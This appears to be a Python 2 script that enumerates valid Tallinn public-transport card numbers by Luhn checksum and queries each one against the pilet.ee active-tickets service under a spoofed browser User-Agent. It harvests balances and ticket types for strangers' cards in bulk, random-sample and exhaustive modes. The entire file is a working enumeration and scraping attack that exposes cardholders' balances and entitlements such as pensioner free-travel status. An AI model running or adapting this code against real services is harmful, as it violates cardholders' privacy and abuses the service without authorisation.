#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import hashlib
import urllib
import urllib2 
import re
import random

from luhn import cardLuhnChecksumIsValid as luhnsum

def fetch_card_content(cardnr):
  result = ""

  headers = {'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)'}
  values = {'active_tickets_filter[card_id]': cardnr}
  data = urllib.urlencode(values)
  url = 'https://www.pilet.ee/viipe/uhiskaart/activetickets?active_tickets_filter_set&ticket_sale_detail_start=0'
  req = urllib2.Request(url, data, headers)
  response = urllib2.urlopen(req)
  page = response.read()

  raha = page.find('Summa kaardil: ')
  if raha != -1:
    m = re.findall(r"Summa kaardil: (-*[\.0-9]*) €", page)
    if len(m) == 1:
      result = m[0] + " EUR "
  else:
    result = "ei saanud infot (ISIC?)"
    return result

  tokens = ['Pensionäri tasuta sõiduõigus',
            'Tallinlase tasuta sõiduõigus',
            'Tallinna tasuta sõiduõigus',
            'Nelja tsooni ühiskaart',
            'Tallinna 30 päeva sooduskaart',
            'Tallinna 30 päeva e-pilet',
            'Tallinna 30 päeva e-sooduspilet',
            '1.-2. tsooni kuupilet',
            '1.-3. tsooni kuupilet',
            '1.-4. tsooni kuupilet',
            'Tallinn-Harjumaa 1.-2. tsooni kuukaart',
            'Tallinn-Harjumaa 1.-3. tsooni kuukaart',
            'Tallinn-Harjumaa 1.-4. tsooni kuukaart',
            '3. tsooni kuupilet',
            '4. tsooni kuupilet',
            'Tallinna 5 päeva kaart',
            'Tallinna 3 päeva e-pilet',
            'Ühe päeva isikustatud e-pilet validaatorist',
            'Ühe tunni e-pilet validaatorist']

  for token in tokens:
    if page.find(token) != -1:
      result += token
      break
  else:
    if page.find('Pileteid ei leitud.') == -1:
      result += ' (TEADMATA PILET!)'

  return result


def valid_pan_numbers():
  return valid_pan_numbers_in_range(1, 3000000)

def valid_pan_numbers_in_range(a, b):
  prefix = "30864900"
  # Praegu on kuni selleni kindel.
  for s in xrange (a, b):
    n = prefix + "9000" + str(s).zfill(7)
    if luhnsum(n):
      yield (n, pan2nr(n))

def validnr(a):
  return luhnsum("30864900" + a)

def pan2nr(pan):
  return pan[-11:]

def print_all_numbers():
  for pan, nr in valid_pan_numbers():
    print nr

def harvest_random_numbers():
  skip = random.randint(1, 50)
  for pan, nr in valid_pan_numbers():
    skip -= 1
    if skip == 0:
      skip = random.randint(1, 50)
      print nr, fetch_card_content(nr)
  

def bingo():
  pallid = list(valid_pan_numbers())
  print "Loosimine ..."
  while True:
    _, nr = random.choice(pallid)
    print nr, fetch_card_content(nr)
    
if __name__ == "__main__":
  if len(sys.argv) < 2:
    print "pilet.py [totalisaator|terminaator|karburaator|bingo|<kaardi PAN>...|<kaardi nr>...]"
    sys.exit(1)     

  for n in sys.argv[1:]:
    if n == "totalisaator":
      print_all_numbers()
    elif n == "terminaator":
      for _, k in valid_pan_numbers():
        print k, fetch_card_content(k)
    elif n == "karburaator":
      harvest_random_numbers()
    elif n == "bingo":
      bingo()
    elif n.startswith('30864900'):
      nr = pan2nr(n)
      print nr, fetch_card_content(nr)
    elif validnr(n):
      print n, fetch_card_content(n)
    else:
      print "pilet.py [totalisaator|terminaator|karburaator|bingo|<kaardi PAN>...|<kaardi nr>...]"
      sys.exit(1)
